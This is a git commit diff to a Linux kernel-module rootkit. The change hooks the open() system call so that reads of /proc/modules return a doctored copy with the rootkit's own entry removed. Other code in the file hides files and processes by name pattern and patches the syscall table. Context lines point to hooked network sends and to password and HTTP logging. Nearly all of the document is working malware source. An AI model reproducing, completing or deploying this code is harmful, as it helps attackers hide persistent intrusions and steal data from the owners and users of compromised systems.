c6a6c5269067afb0c0e7f4a7f83381edffd0f6ef
Eternal <eternal67@gmail.com>
2016-06-18 13:37:13 +0200

    rootkit is invisble in module list

--- rootkit.c
+++ rootkit.c
@@ -11,12 +11,17 @@
 #include <linux/path.h>
 #include <linux/namei.h>
 
-#define file_suffix ".rootkit"
-#define command_contains ".//./"
+#define BEGIN_BUF_SIZE 10000
 #define CMDLINE_SIZE 100
 #define MAX_PROC_PATH 30
 #define FULL_LOG_PATH 30
 #define LOG_SEPARATOR "\n.............................................................\n"
+
+//configuration
+#define file_suffix ".rootkit"
+#define command_contains ".//./"
+#define rootkit_name "rootkit"
+
 
 DEFINE_MUTEX(log_mutex_pass);
 DEFINE_MUTEX(log_mutex_http);
@@ -40,6 +45,8 @@ asmlinkage long (*ref_sys_getdents64) (unsigned int,
     struct linux_dirent64 __user *, unsigned int);
 asmlinkage long (*ref_sys_sendto) (int, void __user *, size_t, unsigned,
     struct sockaddr __user *, int);
+asmlinkage long (*ref_sys_open) (const char __user * filename,
+    int flags, umode_t mode);
 
 
 /*functions for r/w files copied from stackoverflow*/
@@ -162,7 +169,7 @@ int check_process_prefix(const char *name)
 
 	memset(buf, 0, CMDLINE_SIZE + 1);
 
-	err = file_read(f, 0, buf, CMDLINE_SIZE);
+	err = file_read(f, 0, buf, CMDLINE_SIZE);	//todo
 
 
 	for (i = 0; i < CMDLINE_SIZE; i++) {
@@ -171,7 +178,7 @@ int check_process_prefix(const char *name)
 	}
 
 	if (strstr(buf, command_contains)) {
-		printk(KERN_DEBUG "hiding %s\n", buf);
+		printk(KERN_DEBUG "hidding %s\n", buf);
 		res = 1;
 	}
 
@@ -181,9 +188,15 @@ int check_process_prefix(const char *name)
 	return res;
 }
 
+int check_file_name(const char *name)
+{
+	return strcmp(name, rootkit_name) == 0;
+}
+
 int should_be_hidden(const char *name)
 {
-	return check_file_suffix(name) | check_process_prefix(name);
+	return check_file_suffix(name) | check_process_prefix(name) |
+	    check_file_name(name);
 }
 
 asmlinkage long new_sys_getdents(unsigned int fd,
@@ -348,6 +361,97 @@ asmlinkage long new_sys_sendto(int fd, void __user * buff, size_t len,
 	return ret;
 }
 
+char *read_whole_file(struct file *f)
+{
+	int buf_size = BEGIN_BUF_SIZE;
+	int res;
+	int read = 0;
+	char *buf = kzalloc(buf_size + 1, GFP_KERNEL);
+
+	res = file_read(f, read, buf + read, buf_size - read);
+	while (res > 0) {
+		read += res;
+		if (read == buf_size) {
+			char *new_buf = kzalloc(buf_size * 2 + 1, GFP_KERNEL);
+			memcpy(new_buf, buf, buf_size);
+			buf_size = buf_size * 2;
+			kfree(buf);
+			buf = new_buf;
+		}
+		res = file_read(f, read, buf + read, buf_size - read);
+	}
+	return buf;
+}
+
+//when open("/proc/modules") is called, reate fake file with removed rootkit entry and redirect to this file
+asmlinkage long new_sys_open(char __user * filename, int flags, umode_t mode)
+{
+	long ret;
+	if (strcmp(filename, "/proc/modules") == 0) {
+		struct file *fake_modules;
+		struct file *real_modules;
+		mm_segment_t old_fs;
+		char *modules_buf;
+		char *rootkit, *rootkit_end;
+		char *new_path;
+		long res;
+
+		printk(KERN_INFO "open /proc/modules\n");
+
+		new_path =
+		    kzalloc(strlen("/tmp/modules") + strlen(file_suffix) + 1,
+		    GFP_KERNEL);
+		strcpy(new_path, "/tmp/modules");
+		strcat(new_path, file_suffix);
+
+		real_modules = file_open("/proc/modules", O_RDONLY, 0);
+		if (real_modules == NULL)
+			return ref_sys_open(filename, flags, mode);
+
+		char full_path[FULL_LOG_PATH + 1] = "/tmp/";
+		strcat_wrapper(full_path, "modules", FULL_LOG_PATH);
+		strcat_wrapper(full_path, file_suffix, FULL_LOG_PATH);
+
+		//open files
+		fake_modules =
+		    file_open(new_path, O_WRONLY | O_CREAT | O_TRUNC, 0777);
+		if (fake_modules == NULL)
+			return ref_sys_open(filename, flags, mode);
+
+		modules_buf = read_whole_file(real_modules);
+		if (modules_buf == NULL)
+			return ref_sys_open(filename, flags, mode);
+
+		//remove rootkit from modules list
+		rootkit = strstr(modules_buf, rootkit_name);
+		if (rootkit)	//shouldn't be NULL anyway - only if rootkit name is bad configured in #define
+		{
+			rootkit_end = rootkit;
+			while (*rootkit_end != '\n')
+				rootkit_end++;
+			memcpy(rootkit, rootkit_end + 1, strlen(rootkit_end) + 1);	//wiping rootkit entry
+		}
+		//save modules list to fake file
+		res =
+		    file_write(fake_modules, 0, modules_buf,
+		    strlen(modules_buf));
+
+		file_close(fake_modules);
+		file_close(real_modules);
+		kfree(modules_buf);
+
+		//http://stackoverflow.com/questions/7629141/allocate-user-space-memory-from-kernel
+		old_fs = get_fs();
+		set_fs(KERNEL_DS);
+		//redirect open("/proc/modules") to fake file
+		ret = ref_sys_open(new_path, flags, mode);
+		set_fs(old_fs);
+	} else {
+		ret = ref_sys_open(filename, flags, mode);
+	}
+	return ret;
+}
+
 //from https://bbs.archlinux.org/viewtopic.php?id=139406
 
 static unsigned long **aquire_sys_call_table(void)
@@ -383,11 +487,12 @@ static int __init rootkit_start(void)
 
 	write_cr0(original_cr0 & ~0x00010000);
 
-	register (read)
-	register (getdents)
-	register (getdents64)
-	register (sendto)
-	 write_cr0(original_cr0);
+	register (getdents);
+	register (getdents64);
+	register (sendto);
+	register (open);
+
+	write_cr0(original_cr0);
 
 	return 0;
 }
@@ -400,12 +505,12 @@ static void __exit rootkit_end(void)
 
 	write_cr0(original_cr0 & ~0x00010000);
 
-	unregister(read)
-	    unregister(getdents)
-	    unregister(getdents64)
-	    unregister(sendto)
+	unregister(getdents);
+	unregister(getdents64);
+	unregister(sendto);
+	unregister(open);
 
-	    write_cr0(original_cr0);
+	write_cr0(original_cr0);
 
 	msleep(2000);
 }
